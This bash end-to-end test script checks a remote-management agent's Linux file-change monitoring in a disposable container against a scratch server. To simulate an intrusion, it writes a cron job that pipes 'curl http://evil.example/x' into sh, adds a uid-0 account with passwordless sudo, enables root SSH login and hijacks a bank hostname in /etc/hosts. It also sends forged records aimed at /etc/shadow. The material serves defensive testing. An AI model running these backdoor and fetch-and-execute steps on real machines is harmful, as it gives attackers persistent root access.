#!/usr/bin/env bash
# REAL-agent proof of RMM change monitoring on Linux (the file-watch half; the Windows registry, group, task and audit-actor code is NOT exercised here).
#
#   the Linux agent (this tree's build) running under a REAL systemd in a privileged, throwaway ubuntu:24.04 container, watching the container's REAL /etc through the
#   server's default presets and watch policy
#     <--TLS-->  nginx (host network, self-signed CA)  <--http-->  `php -S` serving RivetCore\Rmm on a SCRATCH database
#
# Shows: the agent announces change:monitor and logs:presets; the server offers a SIGNED configuration and the agent runs it; the first reading is a silent baseline;
# real changes to sshd_config, sudoers.d, /etc/passwd, cron.d, a systemd unit, /etc/hosts and a custom folder arrive as change records with the added / removed lines;
# a secret written into a watched file and credential files inside a watched folder never reach the database or the agent's state file; the timeline, search and status
# routes read them; the recommended rules raise alerts through the check evaluator; a rogue device (the real device token, forged records) cannot record outside what it was
# told to watch; housekeeping prunes by retention; the local kill switch withdraws the capability and clears the state; and turning the server switch off stops everything.
# The poll interval is the agent's floor of 60 seconds, so the run takes a few minutes.
#
# The server side is e2e/php_scratch (router.php, setup.php with RMM_PROOF_CHANGE=1, housekeeping.php). Nothing here touches a real database: RIVETCORE_TEST_DB_NAME must
# contain "scratch" and is DROPPED AND RECREATED. Needs docker, php (mysqli), curl, openssl.
#
#   RIVETCORE_TEST_DB_HOST/PORT/USER/PASS/NAME=... [AGENT_BIN=path] e2e/run_change_proof.sh
#
# Prints "ok:"/"FAIL:" lines and a final "CHANGE PROOF PASS" or "CHANGE PROOF FAIL".
# shellcheck disable=SC2034  # variables are read inside the eval-ed check strings
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"; ROOT="$(cd "$HERE/.." && pwd)"
IMG="${SYSTEMD_IMAGE:-jrei/systemd-ubuntu:24.04}"
NGINX_IMG="${NGINX_IMAGE:-nginx:alpine}"
NAME="${PROOF_NAME:-rivetit-changeproof}"
freeport() { python3 -c "import socket;s=socket.socket();s.bind(('127.0.0.1',0));print(s.getsockname()[1])"; }
PHPPORT="${PHP_PORT:-$(freeport)}"; TLSPORT="${TLS_PORT:-$(freeport)}"
GATEWAY="$(docker network inspect bridge -f '{{(index .IPAM.Config 0).Gateway}}' 2>/dev/null || echo 172.17.0.1)"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/rivetit-changeproof.XXXXXX")"
case "${RIVETCORE_TEST_DB_NAME:-}" in *scratch*) ;; *) echo "Refusing: RIVETCORE_TEST_DB_NAME must name a scratch database"; exit 2;; esac
fail=0
ok()  { echo "ok: $*"; }
bad() { echo "FAIL: $*"; fail=1; }
chk() { if eval "$2"; then ok "$1"; else bad "$1  [$2]"; fi; }
wait_for() { local t=$1 c=$2 i=0; while ! eval "$c"; do i=$((i+1)); [ $i -ge $((t*2)) ] && return 1; sleep 0.5; done; return 0; }
PHPPID=""
cleanup() {
  docker rm -f "$NAME" "$NAME-nginx" >/dev/null 2>&1 || true
  [ -n "$PHPPID" ] && kill "$PHPPID" 2>/dev/null || true
  rm -rf "$WORK"
}
trap cleanup EXIT
docker rm -f "$NAME" "$NAME-nginx" >/dev/null 2>&1 || true

echo "== the agent build"
if [ -z "${AGENT_BIN:-}" ]; then
  GOVER="$(sed -n 's/^go \([0-9.]*\).*/\1/p' "$ROOT/go.mod" | head -1)"
  mkdir -p "$WORK/gocache" "$WORK/gomod"
  docker run --rm -u "$(id -u):$(id -g)" -e HOME=/tmp -e CGO_ENABLED=0 -e GOCACHE=/w/gocache -e GOMODCACHE=/w/gomod -v "$ROOT":/src -v "$WORK":/w -w /src "${GO_IMAGE:-golang:$GOVER}" \
    go build -trimpath -ldflags "-s -w -X main.version=0.9.0-proof -X main.commit=changeproof" -o /w/rivetit-agent . || { echo "cannot build the agent"; exit 2; }
  AGENT_BIN="$WORK/rivetit-agent"
fi
[ -x "$AGENT_BIN" ] || { echo "AGENT_BIN $AGENT_BIN not found"; exit 2; }

echo "== scratch database and server"
php -r '
  mysqli_report(MYSQLI_REPORT_OFF);
  $n = getenv("RIVETCORE_TEST_DB_NAME");
  $m = new mysqli(getenv("RIVETCORE_TEST_DB_HOST") ?: "127.0.0.1", getenv("RIVETCORE_TEST_DB_USER") ?: "root", getenv("RIVETCORE_TEST_DB_PASS") ?: "", "", (int) (getenv("RIVETCORE_TEST_DB_PORT") ?: 3306));
  $m->query("DROP DATABASE IF EXISTS `$n`"); $m->query("CREATE DATABASE `$n` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci"); exit($m->error ? 1 : 0);' || { echo "cannot reset the scratch database"; exit 2; }
mkdir -p "$WORK/state" "$WORK/tls"
openssl req -x509 -newkey rsa:2048 -nodes -days 2 -subj "/CN=rivetit-changeproof" -addext "subjectAltName=IP:$GATEWAY,IP:127.0.0.1,DNS:localhost" \
  -keyout "$WORK/tls/key.pem" -out "$WORK/tls/ca.pem" >/dev/null 2>&1
export RMM_PROOF_CHANGE=1 RMM_GOLDEN_ALLOW_LINUX=1
SETUP="$(php "$HERE/php_scratch/setup.php" "$WORK/state" "https://$GATEWAY:$TLSPORT")" || { echo "setup failed: $SETUP"; exit 2; }
TOKEN="$(printf '%s' "$SETUP" | php -r 'echo json_decode(stream_get_contents(STDIN), true)["token"];')"
ADMIN="$(printf '%s' "$SETUP" | php -r 'echo json_decode(stream_get_contents(STDIN), true)["admin_api_token"];')"
dbq() { php -r 'mysqli_report(MYSQLI_REPORT_OFF); $m = new mysqli(getenv("RIVETCORE_TEST_DB_HOST") ?: "127.0.0.1", getenv("RIVETCORE_TEST_DB_USER") ?: "root", getenv("RIVETCORE_TEST_DB_PASS") ?: "", getenv("RIVETCORE_TEST_DB_NAME"), (int) (getenv("RIVETCORE_TEST_DB_PORT") ?: 3306)); $r = $m->query($argv[1]); if ($r instanceof mysqli_result) { $row = $r->fetch_row(); echo $row[0] ?? ""; } elseif (!$r) { fwrite(STDERR, $m->error . "\n"); }' "$1"; }
PHP_CLI_SERVER_WORKERS=4 RMM_GOLDEN_STATE="$WORK/state" php -d display_errors=0 -d log_errors=1 -d "error_log=$WORK/php.log" -S "127.0.0.1:$PHPPORT" "$HERE/php_scratch/router.php" >/dev/null 2>&1 &
PHPPID=$!
wait_for 15 "curl -s -o /dev/null http://127.0.0.1:$PHPPORT/api/v1/nothing" || { bad "php -S did not start"; exit 1; }
cat >"$WORK/nginx.conf" <<NG
events {}
http {
  server {
    listen $TLSPORT ssl;
    ssl_certificate /tls/ca.pem; ssl_certificate_key /tls/key.pem;
    client_max_body_size 4m; proxy_request_buffering off; proxy_buffering off;
    location / { proxy_pass http://127.0.0.1:$PHPPORT; proxy_set_header X-Forwarded-Proto https; proxy_set_header Host \$host; proxy_http_version 1.1; }
  }
}
NG
docker run -d --name "$NAME-nginx" --network host -v "$WORK/tls":/tls:ro -v "$WORK/nginx.conf":/etc/nginx/nginx.conf:ro "$NGINX_IMG" >/dev/null
wait_for 15 "curl -s --cacert $WORK/tls/ca.pem -o /dev/null https://$GATEWAY:$TLSPORT/api/v1/nothing" || { bad "TLS proxy did not start"; exit 1; }
api() { # api METHOD path [json-body] -> body on stdout; the status goes to $WORK/code
  local m=$1 p=$2 b="${3:-}" out
  if [ -n "$b" ]; then out="$(curl -s -w '\n%{http_code}' -X "$m" -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' --data "$b" "http://127.0.0.1:$PHPPORT/api/v1/endpoint_devices/$p")"
  else out="$(curl -s -w '\n%{http_code}' -X "$m" -H "Authorization: Bearer $ADMIN" "http://127.0.0.1:$PHPPORT/api/v1/endpoint_devices/$p")"; fi
  printf '%s' "${out##*$'\n'}" >"$WORK/code"; printf '%s' "${out%$'\n'*}"
}
A() { R="$(api "$@")"; CODE="$(cat "$WORK/code")"; }
jget() { php -r '$d=json_decode(stream_get_contents(STDIN), true); $v=$d; foreach (explode(".", $argv[1]) as $k) { if (is_array($v) && array_key_exists($k, $v)) { $v=$v[$k]; } else { $v=null; break; } } echo is_bool($v) ? ($v ? "true" : "false") : (is_scalar($v) ? $v : json_encode($v));' "$1"; }
hk() { RMM_GOLDEN_STATE="$WORK/state" php -d display_errors=1 "$HERE/php_scratch/housekeeping.php" 2>&1; }

echo "== the server: presets, a custom watch, and the watch policy"
A GET changes/settings
chk "the settings list the presets of both platforms, the six Linux ones on" '[ "$CODE" = 200 ] && [ "$(printf "%s" "$R" | jget enabled)" = true ] && [ "$(printf "%s" "$R" | php -r "\$d=json_decode(stream_get_contents(STDIN),true); echo count(array_filter(\$d[\"presets\"], fn(\$p)=>\$p[\"enabled\"] && \$p[\"platform\"]===\"linux\" && \$p[\"source\"]===\"agent\"));")" = 6 ]'
for BAD in '/etc/shadow' '/etc/ssh/ssh_host_ed25519_key' '/root/.ssh/id_rsa' '/etc/../etc/shadow' '/etc' 'etc/hosts'; do
  A PUT changes/settings "{\"custom\":[{\"id\":\"x\",\"platform\":\"linux\",\"kind\":\"file\",\"paths\":[{\"path\":\"$BAD\"}]}]}"
  chk "a custom watch on $BAD is refused (422)" '[ "$CODE" = 422 ]'
done
A PUT changes/settings '{"custom":[{"id":"x","platform":"windows","kind":"registry","paths":[{"key":"HKLM\\SAM\\SAM\\Domains"}]}]}'
chk "a custom watch on the SAM hive is refused (422)" '[ "$CODE" = 422 ]'

echo "== real systemd container, watched files in place, agent installed with install-linux.sh"
docker run -d --name "$NAME" --privileged --cgroupns=host -v /sys/fs/cgroup:/sys/fs/cgroup:rw --tmpfs /tmp --tmpfs /run --tmpfs /run/lock "$IMG" >/dev/null
for _ in $(seq 1 60); do docker exec "$NAME" systemctl is-system-running 2>/dev/null | grep -Eq 'running|degraded' && break; sleep 0.5; done
docker exec "$NAME" mkdir -p /w
docker cp "$AGENT_BIN" "$NAME:/w/rivetit-agent"; docker cp "$ROOT/scripts/install-linux.sh" "$NAME:/w/install-linux.sh"; docker cp "$WORK/tls/ca.pem" "$NAME:/w/ca.pem"
printf '%s' "$TOKEN" | docker exec -i "$NAME" sh -c 'cat >/w/enroll.token; chmod 600 /w/enroll.token'
q() { docker exec "$NAME" "$@"; }
# what the agent will baseline: a few real configuration files, a custom folder with a secret and two credential files in it
q sh -c 'mkdir -p /etc/ssh /etc/sudoers.d /etc/cron.d /etc/systemd/system /etc/proof.d
  printf "Port 22\nPermitRootLogin no\nPasswordAuthentication no\n" >/etc/ssh/sshd_config
  printf "root ALL=(ALL:ALL) ALL\n" >/etc/sudoers; chmod 440 /etc/sudoers
  printf "ops ALL=(ALL) ALL\n" >/etc/sudoers.d/10-ops; chmod 440 /etc/sudoers.d/10-ops
  printf "# nightly\n17 3 * * * root /usr/local/bin/backup\n" >/etc/cron.d/backup
  printf "host = db1\npassword = hunter2\n" >/etc/proof.d/app.conf
  printf "%s\n" "-----BEGIN OPENSSH PRIVATE KEY-----" "PROOFKEYMATERIAL" >/etc/proof.d/id_rsa
  printf "SITEKEYMATERIAL\n" >/etc/proof.d/site.key; chmod 600 /etc/proof.d/id_rsa /etc/proof.d/site.key'
BOOT="$(q cat /proc/sys/kernel/random/boot_id)"
q bash /w/install-linux.sh --binary /w/rivetit-agent --server "https://$GATEWAY:$TLSPORT" --token-file /w/enroll.token --ca /w/ca.pem >"$WORK/install.out" 2>&1
chk "install exit 0" '[ $? = 0 ]'
wait_for 40 "[ \"\$(api GET '' | jget total)\" = 1 ]"; DEV="$(api GET '' | jget data.0.device_id)"
chk "the agent enrolled against the PHP server and is a device ($DEV)" '[ -n "$DEV" ] && [ "$DEV" != "null" ]'
CAPS="$(wait_for 40 "dbq \"SELECT capabilities_json FROM rmm_device_state WHERE device_id = $DEV\" | grep -q change:monitor" ; dbq "SELECT capabilities_json FROM rmm_device_state WHERE device_id = $DEV")"
chk "the agent announced change:monitor and logs:presets" 'for c in change:monitor logs:presets; do printf "%s" "$CAPS" | grep -q "\"$c\"" || { echo "missing $c"; false; break; }; done'
SD=/var/lib/rivetit-agent
wait_for 60 "q test -s $SD/change_state.json"
chk "the agent verified the signed configuration and started: change_state.json exists, mode 600, root-owned" '[ "$(q stat -c "%a %U" $SD/change_state.json)" = "600 root" ]'
wait_for 60 "[ -n \"\$(dbq \"SELECT config_version FROM endpoint_agent_change_state WHERE device_id = $DEV\")\" ]"
chk "the first batch (the status heartbeat) reached the server with the configuration version" '[ "$(dbq "SELECT LENGTH(config_version) FROM endpoint_agent_change_state WHERE device_id = $DEV")" = 16 ]'
A GET "$DEV/changes/status"
chk "the status route lists the device's watches and what its agent reported (baseline)" '[ "$CODE" = 200 ] && printf "%s" "$R" | grep -q "lnx.ssh" && printf "%s" "$R" | grep -q "custom.proof" && [ "$(printf "%s" "$R" | jget device.monitor.watches.0.state)" != "" ]'
chk "the baseline is not a change: no record yet" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records")" = 0 ]'
SENT="$(dbq "SELECT config_version FROM endpoint_agent_change_state WHERE device_id = $DEV")"
chk "the agent kept no secret and no credential file content in its state file" '! q grep -q -e hunter2 -e PROOFKEYMATERIAL -e SITEKEYMATERIAL $SD/change_state.json'
chk "the credential files in the watched folder were skipped, the other file is in the snapshot" 'q grep -q "app.conf" $SD/change_state.json && ! q grep -q "id_rsa\|site.key" $SD/change_state.json'

echo "== real changes on the device"
q sh -c 'echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
  printf "mallory ALL=(ALL) NOPASSWD: ALL\n" >/etc/sudoers.d/90-mallory; chmod 440 /etc/sudoers.d/90-mallory
  useradd -o -u 0 -g 0 -M -s /bin/bash mallory
  printf "* * * * * root curl http://evil.example/x | sh\n" >/etc/cron.d/evil
  printf "[Service]\nExecStart=/tmp/evil\n" >/etc/systemd/system/evil.service
  printf "10.0.0.5 bank.example.com\n" >>/etc/hosts
  printf "host = db2\npassword = hunter3\n" >/etc/proof.d/app.conf
  printf "%s\n" "-----BEGIN OPENSSH PRIVATE KEY-----" "CHANGEDKEYMATERIAL" >/etc/proof.d/id_rsa'
wait_for 150 "[ \"\$(dbq \"SELECT COUNT(*) FROM endpoint_agent_change_records WHERE device_id = $DEV\")\" -ge 7 ]"
N="$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE device_id = $DEV")"; echo "   records: $N"
rec() { dbq "SELECT CONCAT_WS('|', $2) FROM endpoint_agent_change_records WHERE device_id = $DEV AND target = '$1' ORDER BY change_id LIMIT 1"; }
chk "sshd_config: modified, +1 -0 lines, the added line is shown" '[ "$(rec /etc/ssh/sshd_config "change_type, summary, new_value, watch")" = "2|+1 -0 lines|PermitRootLogin yes|lnx.ssh" ]'
chk "sudoers.d: the new file is added with its line, watch lnx.sudo" '[ "$(rec /etc/sudoers.d/90-mallory "change_type, summary, new_value, watch")" = "1|file added (1 lines)|mallory ALL=(ALL) NOPASSWD: ALL|lnx.sudo" ]'
chk "/etc/passwd: modified, the new account line is shown, the password field is x" '[ "$(rec /etc/passwd "change_type, watch")" = "2|lnx.accounts" ] && dbq "SELECT new_value FROM endpoint_agent_change_records WHERE target = '\''/etc/passwd'\''" | grep -q "^mallory:x:0:0"'
chk "cron.d: the new job is added, watch lnx.cron" '[ "$(rec /etc/cron.d/evil "change_type, watch")" = "1|lnx.cron" ] && dbq "SELECT new_value FROM endpoint_agent_change_records WHERE target = '\''/etc/cron.d/evil'\''" | grep -q "curl http://evil.example/x"'
chk "systemd: the new unit is added, watch lnx.systemd" '[ "$(rec /etc/systemd/system/evil.service "change_type, watch")" = "1|lnx.systemd" ]'
chk "/etc/hosts: modified, watch lnx.hosts" '[ "$(rec /etc/hosts "change_type, watch")" = "2|lnx.hosts" ] && dbq "SELECT new_value FROM endpoint_agent_change_records WHERE target = '\''/etc/hosts'\''" | grep -q "bank.example.com"'
chk "the custom folder: app.conf is modified with the secret masked" '[ "$(rec /etc/proof.d/app.conf "change_type, watch, flags")" = "2|custom.proof|1" ]'
chk "no secret reached the database: not hunter2, not hunter3, no key material" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE CONCAT(old_value, new_value, summary, target, item) REGEXP '\''hunter|KEYMATERIAL|PRIVATE KEY'\''")" = 0 ]'
chk "the credential files of the watched folder produced no record" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE target LIKE '\''%id_rsa%'\'' OR target LIKE '\''%site.key%'\''")" = 0 ]'
chk "...and the agent's state file still holds none of it" '! q grep -q -e hunter -e KEYMATERIAL $SD/change_state.json'
chk "on Linux nobody records the actor: the fields are blank, not guessed" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE actor <> '\'''\'' OR process <> '\'''\''")" = 0 ]'
chk "the agent does not report again what it already sent (the next poll is quiet)" 'sleep 70; [ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE device_id = $DEV")" = "$N" ]'

echo "== search, timeline, fleet, stats"
A GET "$DEV/changes?watch=lnx.sudo"
chk "a search by watch finds the sudoers change only" '[ "$CODE" = 200 ] && [ "$(printf "%s" "$R" | jget total)" = 1 ] && [ "$(printf "%s" "$R" | jget items.0.change)" = added ]'
A GET "$DEV/changes?q=bank.example"
chk "a text search finds the hosts change" '[ "$(printf "%s" "$R" | jget total)" = 1 ] && [ "$(printf "%s" "$R" | jget items.0.target)" = /etc/hosts ]'
A GET "$DEV/changes?q=%25"
chk "a percent sign is text, not a wildcard (no result)" '[ "$(printf "%s" "$R" | jget total)" = 0 ]'
A GET "$DEV/changes/timeline"
chk "the timeline lists every change, newest first, with a per-day count" '[ "$CODE" = 200 ] && [ "$(printf "%s" "$R" | jget items.0.source)" = agent ] && [ "$(printf "%s" "$R" | jget days.0.count)" -ge 7 ]'
A GET "changes?kind=file"
chk "the fleet search reads the same records" '[ "$CODE" = 200 ] && [ "$(printf "%s" "$R" | jget total)" -ge 7 ]'
A GET "changes/stats"
chk "the stats say how much is stored against the fleet cap" '[ "$(printf "%s" "$R" | jget fleet_rows)" -ge 7 ] && [ "$(printf "%s" "$R" | jget fleet_max_rows)" = 500000 ]'

echo "== rules: the recommended ones raise alerts"
A POST changes/rules/recommended '{}'
chk "the recommended rules are created (201), once" '[ "$CODE" = 201 ] && [ "$(printf "%s" "$R" | php -r "echo count(json_decode(stream_get_contents(STDIN), true)[\"created\"]);")" -ge 5 ]'
SSHRULE="$(printf '%s' "$R" | php -r '$d=json_decode(stream_get_contents(STDIN), true); foreach ($d["data"] as $r) if ($r["watch"] === "lnx.ssh") echo $r["rule_id"];')"
A POST changes/rules/recommended '{}'
chk "asking again creates nothing" '[ "$(printf "%s" "$R" | php -r "echo count(json_decode(stream_get_contents(STDIN), true)[\"created\"]);")" = 0 ]'
q sh -c 'echo "AllowTcpForwarding yes" >>/etc/ssh/sshd_config'
alert_open() { case "$(dbq "SELECT status FROM endpoint_agent_checks WHERE device_id = $DEV AND check_key = 'change.rule_$SSHRULE'")" in warn|fail) return 0;; esac; return 1; }
chk "a further change to sshd_config opens the alert (check change.rule_$SSHRULE is warn or fail)" 'wait_for 130 alert_open'

echo "== a rogue device: the real device token, forged records, through the real TLS endpoint"
DEVTOK="$(q cat $SD/device.token | cut -d: -f3)"   # the file is v1:<scheme>:<token>; the scheme on Linux is plain
post() { curl -s --cacert "$WORK/tls/ca.pem" -X POST -H "Authorization: Bearer $DEVTOK" -H 'Content-Type: application/json' --data "$1" "https://$GATEWAY:$TLSPORT/api/v1/agent_changes"; }
NOW="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
BEFORE="$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records")"
FORGED='{"changes":[
 {"ts":"'$NOW'","kind":"file","watch":"lnx.sudo","change":"added","target":"/etc/shadow","item":"","old":"","new":"root:$6$HASH"},
 {"ts":"'$NOW'","kind":"file","watch":"lnx.nope","change":"added","target":"/etc/hosts","item":"","old":"","new":"x"},
 {"ts":"'$NOW'","kind":"registry","watch":"lnx.sudo","change":"added","target":"HKLM\\SAM\\SAM","item":"","old":"","new":"x"},
 {"ts":"'$NOW'","kind":"file","watch":"lnx.sudo","change":"added","target":"/etc/sudoers.d/../shadow","item":"","old":"","new":"x"},
 {"ts":"'$NOW'","kind":"file","watch":"lnx.sudo","change":"added","target":"/etc/ssh/sshd_config","item":"","old":"","new":"x"},
 {"ts":"'$NOW'","kind":"file","watch":"lnx.sudo","change":"added","target":"/etc/sudoers.d/99-forged","item":"","old":"","new":"x password=zzzsecret"}]}'
OUT="$(post "$FORGED")"
chk "only the record that lies inside the watch is accepted (1 of 6), five are dropped" '[ "$(printf "%s" "$OUT" | jget accepted)" = 1 ] && [ "$(printf "%s" "$OUT" | jget dropped)" = 5 ]'
chk "the secret in the accepted forged record was redacted before it was stored" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE new_value LIKE '\''%zzzsecret%'\''")" = 0 ] && [ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records")" = $((BEFORE+1)) ]'
chk "a forged batch with another device id in it still lands on this device only" 'post "{\"changes\":[{\"ts\":\"$NOW\",\"kind\":\"file\",\"watch\":\"lnx.sudo\",\"change\":\"added\",\"target\":\"/etc/sudoers.d/98-other\",\"item\":\"\",\"old\":\"\",\"new\":\"y\",\"device_id\":99999}]}" >/dev/null; [ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE device_id = 99999")" = 0 ]'
CODE2="$(curl -s -o /dev/null -w '%{http_code}' --cacert "$WORK/tls/ca.pem" -X POST -H 'Content-Type: application/json' --data '{"changes":[]}' "https://$GATEWAY:$TLSPORT/api/v1/agent_changes")"
chk "without the device token the endpoint answers 401" '[ "$CODE2" = 401 ]'

echo "== retention and caps"
dbq "UPDATE endpoint_agent_change_records SET occurred_at = DATE_SUB(UTC_TIMESTAMP(), INTERVAL 100 DAY) WHERE target IN ('/etc/hosts', '/etc/passwd')" >/dev/null
HK="$(hk)"; echo "   housekeeping pass: $HK"
chk "housekeeping prunes by retention (90 days): the two backdated records are deleted and the counter follows" 'printf "%s" "$HK" | grep -q "\"pruned_changes_retention\":2" && [ "$(dbq "SELECT row_count FROM endpoint_agent_change_state WHERE device_id = $DEV")" = "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE device_id = $DEV")" ]'

echo "== the local kill switch and the server switch"
q sh -c "sed -i '0,/{/s//{\"disable_change\": true,/' $SD/config.json && systemctl restart rivetit-agent"
chk "disable_change: the agent stops announcing change:monitor" 'wait_for 40 "! dbq \"SELECT capabilities_json FROM rmm_device_state WHERE device_id = $DEV\" | grep -q change:monitor"'
chk "...and forgets what it had kept at once (no watch in its state file)" 'wait_for 40 "! q grep -q lnx.ssh $SD/change_state.json"'
q sh -c "sed -i 's/\"disable_change\": true,//' $SD/config.json && systemctl restart rivetit-agent"
chk "removing the switch brings the capability back" 'wait_for 40 "dbq \"SELECT capabilities_json FROM rmm_device_state WHERE device_id = $DEV\" | grep -q change:monitor"'
chk "...and a fresh baseline (the state file names the watches again, no record is made for them)" 'wait_for 60 "q grep -q lnx.ssh $SD/change_state.json"'
N2="$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records")"
A PUT changes/settings '{"features":{"change_monitor":false}}'
chk "turning the server switch off (no acknowledgement needed) answers 200" '[ "$CODE" = 200 ] && [ "$(printf "%s" "$R" | jget enabled)" = false ]'
OUT="$(post '{"changes":[]}')"
chk "agent_changes answers 503 feature_disabled with the switch off" '[ "$(printf "%s" "$OUT" | jget code)" = feature_disabled ]'
q sh -c 'echo "# off" >>/etc/hosts; echo "Banner /etc/issue" >>/etc/ssh/sshd_config'
chk "the offer is withdrawn: the agent no longer announces it as offered and reads nothing (no new record after 70 s)" 'sleep 70; [ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records")" = "$N2" ]'
A PUT changes/settings '{"features":{"change_monitor":true}}'
chk "turning it on needs the storage acknowledgement (422 confirmation_required)" '[ "$CODE" = 422 ] && [ "$(printf "%s" "$R" | jget code)" = confirmation_required ]'
A PUT changes/settings '{"features":{"change_monitor":true},"accept_change_storage":true}'
chk "with the acknowledgement it is on again (200)" '[ "$CODE" = 200 ] && [ "$(printf "%s" "$R" | jget enabled)" = true ]'
banner_seen() { [ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE new_value LIKE '%Banner /etc/issue%'")" -ge 1 ]; }
chk "back within the day: the kept snapshots find the change made while it was off (the Banner line)" 'wait_for 140 banner_seen'
chk "the machine was not restarted" '[ "$(q cat /proc/sys/kernel/random/boot_id)" = "$BOOT" ]'

echo "== uninstall"
q bash /w/install-linux.sh --uninstall --purge >"$WORK/uninstall.out" 2>&1
chk "uninstall exit 0" '[ $? = 0 ]'
[ $fail = 0 ] && echo "CHANGE PROOF PASS" || { echo "CHANGE PROOF FAIL"; tail -20 "$WORK/php.log" 2>/dev/null; docker exec "$NAME" journalctl -u rivetit-agent --no-pager -n 40 2>/dev/null | tail -40; exit 1; }
